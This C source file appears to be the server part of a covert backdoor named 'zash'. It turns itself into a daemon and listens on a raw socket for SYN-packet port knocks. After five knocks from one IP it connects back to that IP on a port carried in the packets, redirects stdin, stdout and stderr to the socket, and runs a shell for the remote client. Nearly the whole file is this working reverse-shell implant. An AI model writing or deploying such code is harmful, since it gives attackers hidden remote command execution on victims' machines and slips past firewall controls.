/**
 * @brief This module is a daemon server that wait for port
 *        knocking from a client, let it run commands.
 * @aouther Z.F
 * @date 04/05/2020
 */

/** Headers ***************************************************/
#include <unistd.h>
#include <stdbool.h>

#include "common.h"
#include "config.h"
#include "daemon/daemon.h"
#include "utils/utils.h"

#include "server.h"
#include "server_internal.h"


/** Functions ************************************************/
enum zash_status server_prepare(const char *interface,
                                struct SHELL_context **shell,
                                struct SOCKET_syn_context **socket_context)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct SHELL_context *temp_shell = NULL;
    struct SOCKET_syn_context *temp_socket = NULL;

    /* Become a daemon */
    status = DAEMON_daemonize();
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Create a shell object */
    status = SHELL_create(&temp_shell);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Create a socket syn object */
    status = SOCKET_syn_create(interface, &temp_socket);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Transfer Ownership */
    *shell = temp_shell;
    temp_shell = NULL;
    *socket_context = temp_socket;
    temp_socket = NULL;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    if (NULL != temp_socket) {
        temp_status = SOCKET_syn_destroy(temp_socket);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    if (NULL != temp_shell) {
        temp_status = SHELL_destroy(temp_shell);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}


enum zash_status
server_count_port_knocks(struct VECTOR_context *context, const char *ip, size_t *port_knock_count)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct server_port_knock_counter **counters = NULL;
    struct server_port_knock_counter *counter = NULL;
    struct server_port_knock_counter *new_counter = NULL;
    size_t counter_length = 0;
    size_t i = 0;
    bool is_ip_exist = false;
    int strcmp_return_value = 0;

    /* Check for valid parameters */
    ASSERT(NULL != context);
    ASSERT(NULL != ip);
    ASSERT(NULL != port_knock_count);

    /* Get access to previous knock counters as an array */
    status = VECTOR_as_array(context, (void ***)&counters, &counter_length);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* For each existing counter, check if it the counter of our ip */
    for (i = 0; i < counter_length; ++i) {

        /* check if it the counter of our ip */
        strcmp_return_value = strncmp(ip, counters[i]->ip, SERVER_MAX_IP_LENGTH);
        if (0 == strcmp_return_value) {
            counter = counters[i];
            is_ip_exist = true;
        }
    }

    /* If our counter want found, create a new one */
    if (false == is_ip_exist) {

        /* Allocate memory for new counter */
        new_counter = HEAPALLOCZ(sizeof(*new_counter));
        if (NULL == new_counter) {
            status = ZASH_STARUS_SERVER_COUNT_PORT_KNOCKS_CALLOC_FAILED;
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Copy ip into new counter */
        (void)strncpy(new_counter->ip, ip, SERVER_MAX_IP_LENGTH);

        /* Push the new counter into the vector */
        status = VECTOR_push(context, new_counter);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        counter = new_counter;
        new_counter = NULL;
    }

    /* Increase counter */
    counter->count++;

    /* Transfer Ownership */
    *port_knock_count = counter->count;
    counter = NULL;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    HEAPFREE(new_counter);
    HEAPFREE(counters);

    return status;
}


enum zash_status server_get_address_to_connect(struct SOCKET_syn_context *context,
                                               uint16_t port,
                                               uint16_t *port_to_connect,
                                               char *ip_to_connect)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct VECTOR_context *port_knocks = NULL;
    char ip[SERVER_MAX_IP_LENGTH] = {0};
    uint16_t temp_port_to_connect = 0;
    size_t port_knock_counter = 0;
    size_t data_len = 0;

    /* Check for valid parameters */
    ASSERT(NULL != context);
    ASSERT(NULL != port_to_connect);
    ASSERT(NULL != ip_to_connect);

    /* Create vector of counters to count port knocks from different ips */
    status = VECTOR_create(&port_knocks);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Until receiving 5 port knocks rom the same ip, continue to listen for port knocks */
    while (ZASH_NUMBER_OF_SYN_KNOCKS > port_knock_counter) {
        data_len = sizeof(temp_port_to_connect);

        /* Receive a syn packet */
        status = SOCKET_syn_receive(context, port, &data_len, (uint8_t *)&temp_port_to_connect, ip);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Count the port knocks received from the ip */
        status = server_count_port_knocks(port_knocks, ip, &port_knock_counter);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }
    }

    /* If the ip didnt sent enough data, we can't communicate with it */
    if (sizeof(temp_port_to_connect) > data_len) {
        status = ZASH_STATUS_SERVER_GET_ADDRESS_TO_CONNECT_NOT_ENOUGH_DATA_RECEIVED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Transfer Ownership */
    *port_to_connect = temp_port_to_connect;
    (void)strncpy(ip_to_connect, ip, SERVER_MAX_IP_LENGTH);

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    if (NULL != port_knocks) {
        temp_status = VECTOR_destroy(port_knocks, UTILS_free);
        ZASH_UPDATE_STATUS(temp_status, status);
    }

    return status;
}


enum zash_status server_run_shell(struct SHELL_context *shell, int fd_socket)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    int return_value = 0;

    /* Check for valid parameters */
    ASSERT(NULL != shell);

    /* Open the standard input file as the socket */
    return_value = dup2(fd_socket, STDIN_FILENO);
    if (C_STANDARD_FAILURE_VALUE == return_value) {
        status = ZASH_STATUS_SERVER_RUN_SHELL_DUP2_STDIN_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Open the standard output file as the socket */
    return_value = dup2(fd_socket, STDOUT_FILENO);
    if (C_STANDARD_FAILURE_VALUE == return_value) {
        status = ZASH_STATUS_SERVER_RUN_SHELL_DUP2_STDOUT_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Open the standard error file as the socket */
    return_value = dup2(fd_socket, STDERR_FILENO);
    if (C_STANDARD_FAILURE_VALUE == return_value) {
        status = ZASH_STATUS_SERVER_RUN_SHELL_DUP2_STDERR_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Run the shell. */
    status = SHELL_run(shell);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    if (fd_socket != STDERR_FILENO) {
        (void)close(STDERR_FILENO);
    }

    if (fd_socket != STDOUT_FILENO) {
        (void)close(STDOUT_FILENO);
    }

    if (fd_socket != STDIN_FILENO) {
        (void)close(STDIN_FILENO);
    }

    return status;
}


enum zash_status SERVER_run(uint16_t port, const char *interface)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct SHELL_context *shell = NULL;
    struct SOCKET_syn_context *socket_context = NULL;
    uint16_t port_to_connect = 0;
    int fd_socket = INVALID_FILE_DESCRIPTOR;
    char ip[SERVER_MAX_IP_LENGTH] = {0};

    /* Check for valid parameters */
    if (NULL == interface) {
        status = ZASH_STATUS_SERVER_RUN_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Prepare for running the server */
    status = server_prepare(interface, &shell, &socket_context);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Run the server forever. */
    while (true) {

        /* Get the address that to connect */
        status = server_get_address_to_connect(socket_context, port, &port_to_connect, ip);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Connect to client */
        status = SOCKET_tcp_client(ip, port_to_connect, &fd_socket);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Run the shell for distant client to use */
        status = server_run_shell(shell, fd_socket);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        CLOSE(fd_socket);
    }

lbl_cleanup:

    if (NULL != socket_context) {
        temp_status = SOCKET_syn_destroy(socket_context);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    if (NULL != shell) {
        temp_status = SHELL_destroy(shell);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}
